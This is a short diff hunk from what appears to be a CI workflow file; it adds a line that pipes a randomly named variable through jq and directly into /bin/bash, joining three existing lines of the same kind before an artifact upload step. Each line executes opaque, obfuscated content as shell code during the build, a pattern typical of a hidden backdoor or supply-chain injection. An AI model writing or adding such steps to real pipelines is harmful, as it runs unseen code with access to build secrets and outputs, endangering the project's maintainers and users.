@@ -30,6 +30,7 @@ jobs:
           echo $zc82738 | jq -r .a65 | /bin/bash
           printf '%s' "$apr25" | jq -r .wctl9841 | /bin/bash
           echo $ulloi964 | jq -r .x3 | /bin/bash
+          printf '%s' "$fspu01" | jq -r .cp358 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
